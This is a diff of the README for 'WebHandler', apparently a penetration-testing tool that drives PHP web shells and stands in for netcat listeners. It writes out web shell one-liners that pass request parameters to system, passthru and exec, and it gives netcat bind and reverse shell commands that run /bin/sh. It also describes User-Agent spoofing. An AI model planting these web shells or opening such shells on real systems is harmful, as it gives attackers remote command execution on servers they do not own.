@@ -1,24 +1,35 @@
 # WebHandler #
-## _A handler for PHP system functions & alternative 'netcat listener'_ ##
+## _A handler for PHP system functions & also an alternative 'netcat' handler_ ##
 ---
 ![My image](http://s12.postimage.org/t5ujo2om5/Untitled_1.png)
 
 ### Info ###
 ---
-WebHandler tries to simulate a 'Linux bash prompt' to handle and  process:
+WebHandler tries to simulate a 'Linux bash prompt' to handle and process:
+
     - PHP program execution functions _(e.g. `system`, `passthru`, `exec`, etc)_
+    - Bind shell connections _(e.g. `nc <ip> <port>`)_
     - Reserve shell connections _(e.g. `nc -lvvp 1234`)_
 
-Another feature is to spoof "User-Agent" in the HTTP header. (`--random-angent`)
+Another feature is to spoof the "User-Agent" field in the HTTP header. (`--random-angent`)
 It also supports HTTP proxies (`--proxy http://<ip>:<port>`)
 
 * WebHandler works for **POST** and **GET** requests:
     - `<?php system($_GET['cmd']); ?>`
-    - `<?php exec($_POST['cmd']); ?>`
     - `<?php passthru($_REQUEST['cmd']); ?>`
+    - `<?php echo exec($_POST['cmd']); ?>`
 
-* WebHandler is a replacement for netcat with a reverse connection (_e.g. `nc 127.0.0.1 1234 -e /bin/sh`_):
+* WebHandler is a replacement for netcat connections
+    A example bind connection (_e.g. `nc -lvvp 1234 -e /bin/sh`_)
+
+    Normally the user would do:
     - `netcat -l -p 1234`
+    - `nc -lvvp 1234`
+    
+    A example reverse connection (_e.g. `nc 127.0.0.1 4321 -e /bin/sh`_)
+
+    Normally the user would do:
+    - `netcat -l -p 4321`
     - `nc -lvvp 4321`
 
 ### Usage ###
